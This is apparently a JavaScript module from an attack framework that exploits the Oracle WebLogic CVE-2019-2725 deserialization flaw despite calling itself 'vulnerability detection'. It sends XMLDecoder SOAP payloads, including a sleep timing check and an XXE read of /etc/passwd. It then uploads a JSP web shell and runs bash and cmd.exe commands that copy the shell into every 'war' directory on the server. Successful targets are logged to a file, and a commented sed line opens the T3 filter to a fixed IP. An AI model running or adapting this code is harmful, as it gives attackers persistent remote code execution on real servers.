module.exports={
  tags:"weblogic,CNVD-C-2019-48814,48814,48814_4,CVE-2019-2725,2725",
  dependencies:"payload/[x.jsp],java,ysoserial",
	"ID":"030109",
  des:"CNVD-C-2019-48814,48814 Vulnerability detection",
  szXmlHd:'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">',
  szXmlEd:'</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>',
  fnCheckWebShell:function(xUrl,fnCbk2,cmd)
  {
    // var szRunAl = `sed --silent -i --follow-symlinks 's/<connection-filter>weblogic\.security\.net\.ConnectionFilterImpl<\/connection-filter>.*/<connection-filter>weblogic\.security\.net\.ConnectionFilterImpl<\/connection-filter><connection-filter-rule>192\.168\.28\.123 \* \* allow t3 t3s<\/connection-filter-rule>/g' config.xml>config.xml.bak;mv config.xml.bak config.xml`;
    var _t = this,_s = this.self,hst = _s.parseUrl(xUrl);
    if(_t.oUrls[xUrl])return;
    _s.log("check " + xUrl);
    var oOpt = _s.fnOptHeader({
      method: 'POST',
      timeout:7000,
      uri: xUrl
        ,headers:
        {
          "Host":hst.host,
          "User-Agent": "Mozilla/5.0 (windows; U; Intel 18; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
          "Accept-Encoding":"zh-CN,zh"
        }});
    if(cmd)
    {
      oOpt.uri = oOpt.uri.replace(/\?([^=]+)=.*$/gmi,"");
      oOpt.body = xUrl.replace(/(^.*?\?)|(=.*?$)/gmi,"") + encodeURIComponent(cmd);
      // console.log(oOpt.body)
      oOpt.headers["content-type"] = "application/x-www-form-urlencoded";
    }
    _s.request(oOpt,function(e,r,b)
    {
      if(_t.oUrls[xUrl])return;
      if(e)return _s.error(e,xUrl);
      var szRk = "ip:"
      // _s.log("curl '" + xUrl + "'");
      b = String(b);
      // console.log( b);
      // "Not Found;302 Moved Temporarily"
      var hvIp = -1 < b.indexOf(szRk);
      if(fnCbk2)fnCbk2(hvIp);
      if(hvIp)
      {
        _s.emit('jspShell',xUrl, _t);
        try{_s.oUrls[xUrl]=1;}catch(e){}
        // console.log(b);
        b = b.replace(/(^\s*)|(\s*$)/gmi,'');
        _s.log("curl '" + xUrl + "'");
        _s.log(b);
        _s.fs.appendFile("data/Ok.txt", xUrl + "\n",function(){});
      }
      else
      {
        if(-1 == String(b).indexOf("404--Not Found"))
          _s.log("get: " + xUrl + "\n" + b);
      }
      return;
    });
  },
  uploadPayload:function(fileName,code,url,fnCbk)
  {
    return;
    
  },
  cmdPayload:function(url,osBash,cmd,fnCbk)
  {
    var _t = this,_s = this.self,szPay = cmd;
    var s1_ = `<!DOCTYPE contact [
      <!ENTITY xxx SYSTEM "file:///etc/passwd">
      ]>
      <java version="1.7.0_21" class="java.beans.XMLDecoder">
       <object class="Bean">
        <void property="name">
         <string>&xxx;</string>
        </void>
       </object>
      </java>
`;

    var bType = -1 < osBash.indexOf("cmd"),sB = bType ? "cmd.exe" : "/bin/bash";
    s1_ = s1_.replace(/\{bash\}/gmi,sB).replace(/\{c\}/gmi, bType?"/c":"-c").replace(/\{code\}/gmi, cmd);
    
    // console.log(url)
    _t.sendPayload(url,s1_,{timeout:10000},function(e,r,b)
    {
       if(r && 202 == r.statusCode|| -1 < String(b).indexOf("<faultstring>"))
       {
          if(fnCbk)fnCbk('',url);
       }
    });
  },
  sendPayload:function(url, szPayload, opt, fnCbk)
  {
    szPayload = this.szXmlHd + szPayload + this.szXmlEd;
    // console.log(url)
    var _t = this,_s = this.self;
    var hst = _s.parseUrl(url);

    var oOpt = _s.fnOptHeader({
            method: 'POST',
            uri: url,
            // timeout:5000,
            body:szPayload
              ,headers:
              {
                "Host":hst.host,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
                "accept-encoding":"gzip, deflate",
                'x-forwarded-for': "127.0.0.1",
                'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                'accept-language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                'cache-control': "no-cache",
                "content-type":"text/xml"
              }});
    if(opt)
    {
      for(var k in opt)
      {
        if(opt[k])oOpt[k]= opt[k];
      }
      
    }
    _s.request(oOpt, fnCbk);
  },
  oUrls:{},
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self, szOld = url,bBreakFor1 = false,
       // ??????????????????????????????path????????????
       aPath = '/_async/AsyncResponseService,/_async/AsyncResponseServiceHttps,/_async/AsyncResponseServiceJms,/_async/AsyncResponseServiceSoap12,/_async/AsyncResponseServiceSoap12Https,/_async/AsyncResponseServiceSoap12Jms'.split(',');
/*
1???timebase
2???run
3???upload file
*/
    var s = _s.fnMyHelp(function(){
/*
  <java version="1.4.0" class="java.beans.XMLDecoder">
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
</java>

*/});
    var oUrls =_t.oUrls,szRk = "ip:", g_nFlg = 0, szJspName = "X11.jsp",fnTmp1,ks5;
    var bBreakFor = false,hst = _s.parseUrl(url);

		var nNum = new Date().getTime()/1000,nTime = 0,fCbk = function(b,r,e,u,fnCbk2)
     {
         // _s.log("check all " + u)
         // ??????
        // if(-1 < u.indexOf('/_async/'))
        {
          var aT = "_async;bea_wls_cluster_internal;cloudstore;bea_wls_internal;wls-wsat;bea_wls_deployment_internal;bea_wls_management_internal2;consoleapp;uddiexplorer;uddi".split(/;/);
          bBreakFor = false;
          var fnFor = function(xUrl)
            {
              if(oUrls[xUrl])
              {
                _s.log("??????????????????????????? " + xUrl)
                return;
              }
              _s.log("test:\n curl '" + xUrl + "'");
              // console.log("start " + xUrl);
              // _s.fnGetRequest(_s.request,{timeout:1000})
              _s.log("test " + xUrl);
              _s.request.get({uri:xUrl,timeout:20000},function(e,r,b)
              {
                if(oUrls[xUrl])return;
                if(e || !b)
                {
                    _s.log(xUrl + " " + e.toString());
                  return;
                }
                
                console.log("curl '" + xUrl + "'");//_s.log
                b = String(b);
                // console.log( b);
                // "Not Found;302 Moved Temporarily"
                var hvIp = -1 < b.indexOf(szRk);
                if(fnCbk2)fnCbk2(hvIp);
                if(hvIp)
                {
                  _s.emit('jspShell',xUrl, _t);
                  oUrls[xUrl]=1;
                  j = 10000;aT = [];bBreakFor=true; // break for
                  // console.log("????????? " + xUrl + "\n" + b);
                  b = b.replace(/(^\s*)|(\s*$)/gmi,'');
                  _s.log("Ok:\ncurl '" + xUrl + "'");
                  if(b)_s.log(b);
                  _s.fs.appendFile("data/Ok.txt", xUrl + "\n",function(){});
                  fnCbk({});
                }
                else if(-1 == String(b).indexOf("Not Found"))
                {
                  _s.log("get: " + xUrl + "\n" + b);
                }
                return;
              });
            };
          for(var j = 0; j < aT.length; j++)
          {
            if(bBreakFor)break;
            (function(xxU){
              // _s.log(u + "\n======\n" + u.replace(/(wls\-wsat)|(bea_wls_internal)/gmi, xxU));
              fnFor(u.replace(/(\_async)|(bea_wls_internal)/gmi, xxU));  
            })(aT[j]);
          }
        }
     };
		// s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// ??????????????????????????????????????????????????????????????????????????????????????????
		// s = s5;
    // console.log(s);
    // console.log(hst);
    var oCTmp = _s.getX11_linuxShell("{code}"), s1_1 = oCTmp.c;
        szJspName = oCTmp.j;
    var szTmpUrl = [hst.protocol,"//", hst.host,"/bea_wls_internal/",szJspName,""].join("");
    fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl,fnCbk2)
        {
           // console.log("fnTmp1")
           s = szPld||s;
           nNum = new Date().getTime()/1000,nTime = 0;
           nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
           s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
           var url1 = szOld.substr(0, szOld.indexOf('/',13));
           url = url1 + p11;// '/wls-wsat/CoordinatorPortType'
          // console.log(url);
          var oOpt = {timeout: nTime + 80000};
          // console.log(szPld||s)
          _t.sendPayload(url,szPld||s, oOpt, function (error, response, body)
          {
              if(fnTmpCbk){fnTmpCbk(body,response,error,url1 + szTUrl,fnCbk2);return;}
              body = String(body || response && response.statusCode || error||"");
              if(-1 < body.indexOf("Error: ESOCKETTIMEDOUT"))
                {
                  // _t.fnCheckWebShell(szTmpUrl);
                  // console.log(szTmpUrl)
                  body = "ESOCKETTIMEDOUT",error=null;
                }
              if(error)_s.error(error);
              // console.log(body)
              if(response && response.statusCode != 202)
              {
                // console.log(this.href);
                // _s.log("????????????WebLogic CNVD-C-2019-48814 ???????????????response.statusCode???"  + response.statusCode + response.body);
                return;
              }
              var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
              // console.log(String(body));
              // console.log([nT,nT2]);
              // console.log(response.headers);
              // _s.log(body);
              if(nT >= nT2 || response && response.statusCode == 202)
              {
                var r = {vul:true,"body":String(body),href:_t.href||'',"url":szOld,"send":s,"des":
                  "?????????????????? WebLogic CNVD-C-2019-48814 ????????????, ??????" + (nTime/1000) + "???????????????????????????" + nT + "???",
                  statusCode:(response && response.statusCode||0)};
                  // X-Powered-By,Set-Cookie,Date
                  // X-Pad: avoid browser bug
                // console.log(r);
                if(r && r.vul)
                {
                   bBreakFor1 = true;
                   
                   if(global.X11){return fnCbk({},_t);}// ?????????????????????
                   else
                   {
                       global.X11=true;

                       // ????????????win???linux???payloa
                       _s.log("send payload: win or linux ,web shell to servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName);
                       var szUrl = [hst.protocol,"//", hst.host,aPath[0]].join(""), ckCbk = null,
                           szJspPayload = _s.fs.readFileSync("payload/x.jsp").toString("utf-8");
                       _t.uploadPayload("servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName,
                          szJspPayload,szUrl,ckCbk = function()
                      {
                        _s.log("check xxx " + szTmpUrl);
                        _t.fnCheckWebShell(szTmpUrl);
                        // fCbk('','','',ssT);
                      });

                       // ???????????????????????????
                       _s.log("send payload: win or linux ,web shell ./" + szJspName);
                       _t.uploadPayload(szJspName, szJspPayload,szUrl,function(){
                          var fnCbktmp = function()
                          {
                            fCbk('','','',szTmpUrl);
                          };
                          
                          // var szBash = "find / -type d -name 'war' 2>/dev/null|xargs -I K cp -f " + szJspName +  " K/ta/417.jsp";
                          var szBash = "find / -type d -name 'war' 2>/dev/null|xargs -I K cp -f " + szJspName +  " K/" + szJspName;

                          // _s.log("send payload: linux ,run: " + szBash);
                          _t.cmdPayload(szUrl,'/bin/bash', szBash,fnCbktmp);
                          szBash = "for /f %i in ('dir /s /b war') do copy /y " + szJspName + " %i\\" + szJspName;
                          // szBash = "for /f %i in ('dir /s /b war') do copy /y " + szJspName + " %i\\ta\\417.jsp";
                          
                          // _s.log("send payload: win ,run: " + szBash);
                          _t.cmdPayload(szUrl,'cmd.exe', szBash,fnCbktmp);
                       });
                       // _s.log([oCTmp.c,szJspName]);
                      _s.log("send payload: linux, bash make all war/" + szJspName);
                      _t.cmdPayload(szUrl,'/bin/bash',s1_1,function()
                      {
                        fCbk('','','',szTmpUrl);
                      });

                       // fnTmp1(aPath[0],s = s1_1,fCbk,"/wls-wsat/" + szJspName);
                   }
                }
                fnCbk(r,_t);
                r = null;
              }
              else
              {
                var szTmp = String(body||"").trim();
                szTmp = "undefined" == szTmp ? "":szTmp;
                // if(response && 202 == response.statusCode)
                {
                  try{
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/bea_wls_internal/${szJspName}`).toString());
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/uddiexplorer/${szJspName}`).toString());
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/_async/${szJspName}`).toString());
                  }catch(e){}
                }
                // else _s.log("2???????????????WebLogic CVE-2017-10271 ???????????????response.statusCode???" + szTmp);
              }
              //_s.log(body);
             }
           );
        };
    for(var i = 0; i < aPath.length; i++)
    {
      if(bBreakFor1)break;
      fnTmp1(aPath[i]);
    }
	}
};
